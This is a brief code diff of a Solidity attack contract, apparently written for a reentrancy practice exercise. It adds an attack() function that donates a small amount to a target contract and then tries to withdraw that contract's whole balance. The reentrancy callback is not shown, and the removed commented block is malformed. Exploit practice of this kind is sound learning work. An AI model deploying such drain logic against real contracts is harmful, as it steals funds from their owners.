@@ -15,15 +15,11 @@ contract Reentrance {
 
   constructor() payable {
     targetContract = IReentrance(payable(targetAddress));
-    address(targetContract).call(
-      abi.encodeWithSignature("withdraw(uint256)", 0.01 ether)
-    );
-    /*
-    targetContract.withdraw(
-      0.001 ether
-      data: abi.encodeWithSignature("donate(address)", address(exitAddress))
-    );
-    */
-      
   }
+
+  function attack() public {
+    targetContract.donate{value: 0.001 ether}(exitAddress);
+    targetContract.withdraw(address(targetContract).balance); 
+  }
+
 }
